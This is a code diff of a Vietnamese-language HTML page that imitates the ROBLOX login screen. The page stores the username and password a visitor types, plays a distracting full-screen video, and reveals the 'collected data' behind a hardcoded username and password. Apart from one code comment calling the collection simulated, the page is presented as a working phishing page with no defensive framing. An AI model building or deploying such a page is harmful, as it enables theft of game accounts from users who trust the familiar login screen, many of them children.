@@ -2,52 +2,63 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background-color: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { width: 90%; max-width: 400px; text-align: center; }
-        .logo { font-size: 40px; font-weight: bold; margin-bottom: 20px; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 5px; border: none; background: #2a2a2a; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; margin: 10px 0; border-radius: 5px; border: none; background: #0084ff; color: white; font-weight: bold; cursor: pointer; }
-        .btn-fast { background: transparent; border: 2px solid #fff; }
-        #homeArea, #videoOverlay { display: none; }
+        body { background-color: #000; color: #fff; font-family: sans-serif; margin: 0; }
+        #nav { font-size: 10px; padding: 5px; border-bottom: 1px solid #333; display: none; }
+        #loginForm { padding: 20px; text-align: center; }
+        input { background: #222; border: 1px solid #444; color: white; padding: 8px; width: 80%; margin: 5px; }
+        button { padding: 8px 20px; background: #0084ff; border: none; color: white; cursor: pointer; }
+        #homeArea { display: none; padding: 20px; }
+        #vid { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
 
-<div class="container" id="loginForm">
-    <div class="logo">ROBLOX</div>
-    <input type="text" id="user" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại">
-    <input type="password" id="pass" placeholder="Mật khẩu">
+<div id="nav"><a href="#" onclick="viewHome()" style="color:#fff; text-decoration:none;">Home</a></div>
+
+<div id="loginForm">
+    <h2>ROBLOX</h2>
+    <input type="text" id="user" placeholder="Tên đăng nhập"><br>
+    <input type="password" id="pass" placeholder="Mật khẩu"><br>
     <button onclick="login()">Đăng nhập</button>
-    <button class="btn-fast">Đăng Nhập Nhanh</button>
 </div>
 
-<div id="homeArea" class="container">
+<div id="homeArea">
     <h3>Dữ liệu đã thu thập:</h3>
-    <p id="result"></p>
+    <div id="result"></div>
 </div>
 
-<div id="videoOverlay" style="position:fixed; top:0; left:0; width:100%; height:100%; background:black;">
-    <video id="vid" width="100%" height="100%" loop autoplay muted>
-        <source src="video_url.mp4" type="video/mp4">
-    </video>
-</div>
+<video id="vid" loop>
+    <source src="video_url.mp4" type="video/mp4">
+</video>
 
 <script>
     function login() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
         
-        document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('homeArea').style.display = 'block';
-        document.getElementById('result').innerText = "User: " + u + " | Pass: " + p;
+        // Lưu dữ liệu vào localStorage (Giả lập thu thập)
+        localStorage.setItem('captured_user', u);
+        localStorage.setItem('captured_pass', p);
         
+        // Kích hoạt video
         const v = document.getElementById('vid');
-        document.getElementById('videoOverlay').style.display = 'block';
-        v.muted = false;
+        v.style.display = 'block';
         v.volume = 1.0;
         v.play();
+
+        // Kiểm tra điều kiện mở khóa Home
+        if(u === "ggg36" && p === "36thanhhoa") {
+            document.getElementById('nav').style.display = 'block';
+        }
+    }
+
+    function viewHome() {
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('vid').style.display = 'none';
+        document.getElementById('homeArea').style.display = 'block';
+        document.getElementById('result').innerText = "User: " + localStorage.getItem('captured_user') + 
+                                                      " | Pass: " + localStorage.getItem('captured_pass');
     }
 </script>
 </body>
